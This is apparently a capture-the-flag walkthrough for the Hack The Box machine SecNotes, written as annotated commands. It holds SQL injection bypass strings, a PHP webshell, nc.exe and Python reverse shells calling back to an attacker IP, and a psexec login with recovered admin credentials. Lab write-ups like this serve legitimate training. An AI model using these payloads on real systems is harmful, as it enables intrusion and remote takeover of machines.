# HTB: [SecNotes](https://www.hackthebox.com/machines/secnotes)  
# Walkthrough: [Video](https://youtu.be/gCfnjLkgShA)

```bash
#############################################
# 1️⃣ Account Creation & Web Bugs
#############################################

# Register new user, login
# Discovered: can change password without old pass
http://10.129.136.67/change_pass.php?password=abc123&confirm_password=abc123&submit=submit

# Contact page → found Tyler’s email
# Attempted SSRF with netcat listener
nc -nvlp 80
# Received callback, injected password-reset URL into message field
# Tyler’s password changed → tyler:abc123


#############################################
# 2️⃣ Alternative: SQL Injection
#############################################

# Auth bypass payloads
' or 1'='1
SLEEP(2) /*' or SLEEP(2) or '" or SLEEP(2) or "*/

# Successful login as Tyler
tyler@secnotes.htb


#############################################
# 3️⃣ Webshell & Reverse Shell
#############################################

# Uploaded simple PHP webshell
<?php system($_REQUEST['cmd']); ?>

# Uploaded nc.exe for reverse shell
http://10.129.136.67:8808/c.php?cmd=whoami
http://10.129.136.67:8808/c.php?cmd=nc.exe -e cmd.exe 10.10.14.33 4422


#############################################
# 4️⃣ WSL Discovery & Abuse
#############################################

# Found Ubuntu.zip and bash.lnk → WSL present
where /R C:\Windows wsl.exe
where /R C:\Windows bash.exe

# Reverse shell through WSL binary
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe \
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.33",4321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Dead end under /mnt/c
# Checked root history: ls -lah /root


#############################################
# 5️⃣ Privilege Escalation
#############################################

# Impacket psexec with recovered Administrator creds
impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.136.67
```
